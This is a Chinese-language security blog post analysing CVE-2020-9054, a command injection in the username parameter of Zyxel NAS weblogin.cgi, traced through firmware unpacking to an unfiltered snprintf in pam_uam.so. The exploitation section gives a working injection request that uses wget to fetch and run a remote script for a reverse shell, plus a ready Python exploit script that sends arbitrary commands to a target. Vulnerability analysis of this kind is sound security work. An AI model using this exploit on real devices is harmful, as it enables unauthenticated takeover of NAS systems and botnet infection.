# zyxel nas CVE-2020-9054 漏洞分析

阅读量 **267989**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-25 17:30:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t011864d9bd3a26d3c0.png)

## 一、漏洞概述

CVE-2020-9054是由于可执行文件weblogin.cgi在身份验证期间未正确过滤username参数造成的，导致攻击者可以在传递给此文件的用户名中包含某些特殊字符来触发漏洞，进而以webserver的权限实现命令注入。

## 二、漏洞分析

官网下载Zyxel
NAS326_V5.21(AAZF.0)C0版本固件，使用binwalk直接解包即可，定位到weblogin.cgi,使用ida打开ext-root-bin.cgi

通过

    
    
    gcgiFetchStringNext("username", username, 63)

获取用户名，长度63（不知道输入超过63个行不行） 然后进入

    
    
     if ( user_auth(username, (int)password, (int)remote_addr, (int)v18, nptr, v8) >= 0 )// pam_authenticate()

调用

    
    
    v20 = pam_authenticate(v18, 0x8000);

查找 pam_sm_authenticate() 函数

    
    
    ubuntu@ubuntu:~/Desktop/zyxel/nas/NAS326_V5.21(AAZF.0)C0/_521AAZF0C0.bin.extracted/_71BEA9.extracted/ext-root$ grep "pam_sm_authenticate" -r
    Binary file usr/lib/libpam.so.0.83.1 matches
    Binary file lib/security/pam_pidhome.so matches
    Binary file lib/security/pam_auth_admin.so matches
    Binary file lib/security/pam_guestok.so matches
    Binary file lib/security/pam_cloud_step2.so matches
    Binary file lib/security/pam_smbpass.so matches
    Binary file lib/security/pam_nologin.so matches
    ***Binary file lib/security/pam_uam.so matches***
    Binary file lib/security/pam_cloud_step1.so matches

定位文件lib/security/pam_uam.so，ida打开如下：

snprinf（） 格式化username时，未作过滤，导致命令注入

## 三、漏洞利用

由于漏洞执行命令不能回显，使用下载执行，进行反弹：

    
    
    POST http://ip/adv./cgi-bin/weblogin.cgi?username=admin';cd /tmp;wget http://xxx.xxx.xxx.xxx/re;sh re #&password=aaa
    
    import requests
    import sys
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    def exec_command(url, command):
        injection = "admin';%s #" %(command)
        data = {"password": "asdf",
                "username": injection}
        try:
            r = requests.post(url=url, data=data, verify=False)
        except Exception as e:
            print (e)
        print(r.text)
    
    if __name__ == "__main__":
        target = "https://x.x.x.x/r51201,/desktop,/cgi-bin/weblogin.cgi"
        #for test
        cmd ="wget x.x.x.x;"
        exec_command(target, cmd)

有些网站的目录不一定时/adv./，需要自己登录访问观察下。

## 四、补丁对比

## 参考

请及时更新固件！能利用CVE-2020-9054的Mirai新变种来袭：

https://www.6cu.com/seoxuetang/kj/2020/0328/47808.html

PAM详解：

http://blog.chinaunix.net/uid-29479952-id-5761558.html

poc test: https://kb.cert.org/artifacts/cve-2020-9054.html

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **PandaIsCoding** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256777](/post/id/256777)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t011f2416f5f80ad992.jpg)
PandaIsCoding

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

